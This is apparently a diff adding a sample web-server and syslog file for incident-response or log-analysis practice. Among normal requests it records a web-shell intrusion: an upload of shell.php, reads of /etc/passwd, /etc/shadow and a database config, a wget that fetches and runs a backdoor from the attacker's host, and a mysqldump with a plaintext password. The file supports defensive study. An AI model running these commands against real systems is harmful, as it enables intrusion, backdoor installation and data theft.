@@ -1,0 +1,54 @@
+203.0.113.10 - - [14/Jun/2026:09:00:12 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+203.0.113.10 - - [14/Jun/2026:09:00:13 +0000] "GET /css/style.css HTTP/1.1" 200 4521 "http://webapp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.10 - - [14/Jun/2026:09:00:13 +0000] "GET /js/app.js HTTP/1.1" 200 8910 "http://webapp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.10 - - [14/Jun/2026:09:00:14 +0000] "GET /images/logo.png HTTP/1.1" 304 0 "http://webapp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+198.51.100.25 - - [14/Jun/2026:09:01:05 +0000] "GET /about HTTP/1.1" 200 8432 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+198.51.100.25 - - [14/Jun/2026:09:01:06 +0000] "GET /css/style.css HTTP/1.1" 304 0 "http://webapp.local/about" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+172.16.0.88 - - [14/Jun/2026:09:02:30 +0000] "GET /api/products HTTP/1.1" 200 12044 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"
+172.16.0.88 - - [14/Jun/2026:09:02:31 +0000] "GET /api/products/42 HTTP/1.1" 200 1523 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"
+91.189.91.38 - - [14/Jun/2026:09:10:44 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+91.189.91.38 - - [14/Jun/2026:09:10:51 +0000] "GET /robots.txt HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:11:02 +0000] "GET /sitemap.xml HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:11:15 +0000] "GET /admin HTTP/1.1" 403 287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:11:23 +0000] "GET /wp-admin HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:11:30 +0000] "GET /administrator HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:11:38 +0000] "GET /upload HTTP/1.1" 200 3241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:11:45 +0000] "GET /upload.php HTTP/1.1" 200 3241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.10 - - [14/Jun/2026:09:12:00 +0000] "GET /products HTTP/1.1" 200 9876 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+198.51.100.25 - - [14/Jun/2026:09:12:15 +0000] "GET /contact HTTP/1.1" 200 5432 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+172.16.0.88 - - [14/Jun/2026:09:12:30 +0000] "POST /api/cart HTTP/1.1" 201 256 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"
+91.189.91.38 - - [14/Jun/2026:09:13:02 +0000] "POST /upload.php HTTP/1.1" 200 87 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:05 +0000] "GET /uploads/shell.php HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:15 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:22 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 52 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:30 +0000] "GET /uploads/shell.php?cmd=uname+-a HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:38 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1847 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:45 +0000] "GET /uploads/shell.php?cmd=ls+-la+/var/www HTTP/1.1" 200 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:13:52 +0000] "GET /uploads/shell.php?cmd=cat+/var/www/html/config/db.php HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:14:01 +0000] "GET /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:14:10 +0000] "GET /uploads/shell.php?cmd=netstat+-tlnp HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:14:18 +0000] "GET /uploads/shell.php?cmd=wget+http://91.189.91.38:4444/backdoor+-O+/tmp/.bd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:14:25 +0000] "GET /uploads/shell.php?cmd=chmod+%2bx+/tmp/.bd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:14:33 +0000] "GET /uploads/shell.php?cmd=nohup+/tmp/.bd+%26 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Jun 14 09:13:15 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: whoami
+Jun 14 09:13:22 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: id
+Jun 14 09:13:30 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: uname -a
+Jun 14 09:13:38 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: cat /etc/passwd
+Jun 14 09:13:45 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: ls -la /var/www
+Jun 14 09:13:52 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: cat /var/www/html/config/db.php
+Jun 14 09:14:01 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: cat /etc/shadow (permission denied)
+Jun 14 09:14:10 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: netstat -tlnp
+Jun 14 09:14:18 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: wget http://91.189.91.38:4444/backdoor -O /tmp/.bd
+Jun 14 09:14:25 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: chmod +x /tmp/.bd
+Jun 14 09:14:33 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: nohup /tmp/.bd &
+Jun 14 09:14:34 webapp-srv kernel: [84521.332] TCP: www-data established outbound connection to 91.189.91.38:4444
+203.0.113.10 - - [14/Jun/2026:09:15:00 +0000] "GET /products/15 HTTP/1.1" 200 4312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+198.51.100.25 - - [14/Jun/2026:09:15:22 +0000] "POST /contact HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+172.16.0.88 - - [14/Jun/2026:09:15:45 +0000] "GET /api/cart HTTP/1.1" 200 856 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"
+203.0.113.10 - - [14/Jun/2026:09:16:01 +0000] "GET /checkout HTTP/1.1" 200 7654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:18:05 +0000] "GET /uploads/shell.php?cmd=find+/+-name+*.sql+-type+f HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+91.189.91.38 - - [14/Jun/2026:09:18:20 +0000] "GET /uploads/shell.php?cmd=mysqldump+-u+root+-pdbpass123+webapp+>+/tmp/dump.sql HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Jun 14 09:18:05 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: find / -name *.sql -type f
+Jun 14 09:18:20 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: mysqldump -u root -pdbpass123 webapp > /tmp/dump.sql
+198.51.100.25 - - [14/Jun/2026:09:20:00 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+203.0.113.10 - - [14/Jun/2026:09:20:15 +0000] "GET /api/orders HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
